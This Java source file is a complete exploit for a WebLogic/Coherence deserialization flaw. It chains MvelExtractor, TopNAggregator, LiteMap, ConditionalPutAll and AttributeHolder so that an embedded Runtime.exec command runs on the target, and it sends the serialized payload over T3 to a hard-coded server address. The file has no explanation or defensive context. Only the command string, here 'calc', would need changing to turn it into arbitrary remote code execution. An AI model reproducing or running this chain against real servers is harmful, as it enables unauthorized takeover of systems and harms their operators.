package com.supeream;

import com.sun.org.apache.xpath.internal.objects.XString;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.internal.util.SimpleBinaryEntry;
import com.tangosol.util.*;
import com.tangosol.util.aggregator.TopNAggregator;
import com.tangosol.util.function.Remote;
import com.tangosol.util.processor.ConditionalPutAll;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class Test {
    public static void main(String[] args) throws Exception{

        MvelExtractor extractor = new MvelExtractor("Runtime.getRuntime().exec(\"calc\");");

        TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult((Comparator)extractor, 1);
        NavigableMap<Object, Object> map = new TreeMap<>();
        Field field = SortedBag.class.getDeclaredField("m_map");
        field.setAccessible(true);
        map.put("1", "1");
        field.set(partialResult, map);

        Binary binarykey = ExternalizableHelper.toBinary(partialResult);
        Binary binaryvalue = new Binary();
        SimpleBinaryEntry simpleBinaryEntry = new SimpleBinaryEntry(binarykey, binaryvalue);


        XString xString = new XString("1");
        LiteMap liteMap = new LiteMap();

        setFieldValuex(liteMap,"m_nImpl",intToByteArray(3)[3]);

        Field m_oContents = liteMap.getClass().getSuperclass().getDeclaredField("m_oContents");
        m_oContents.setAccessible(true);

        Map.Entry[] aEntry = new Map.Entry[8];

        Map.Entry<SimpleBinaryEntry, String> x1 = new AbstractMap.SimpleEntry<>(simpleBinaryEntry, "aaa");
        Map.Entry<XString, String> x2 = new AbstractMap.SimpleEntry<>(xString, "bbb");
        aEntry[0] = x1;
        aEntry[1] = x2;


        m_oContents.set(liteMap, aEntry);
        ConditionalPutAll conditionalPutAll = new ConditionalPutAll();
        setFieldValuex(conditionalPutAll, "m_map", liteMap);
        AttributeHolder attributeHolder2 = new AttributeHolder();
        Method setInternalValue = attributeHolder2.getClass().getDeclaredMethod("setInternalValue", Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder2, conditionalPutAll);

        T3ProtocolOperation.send("192.168.129.143", "7001", Serializables.serialize(attributeHolder2));

//        File f = new File("tmp1.ser");
//        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(f));
//        obj.writeObject(attributeHolder2);
//        obj.close();
    }

    public static void setFieldValuex(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }

    public static Field getField(Class<?> clazz, String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException var4) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static byte[] intToByteArray(int i) {
        byte[] result = new byte[4];
        result[0] = (byte)((i >> 24) & 0xFF);
        result[1] = (byte)((i >> 16) & 0xFF);
        result[2] = (byte)((i >> 8) & 0xFF);
        result[3] = (byte)(i & 0xFF);
        return result;
    }
}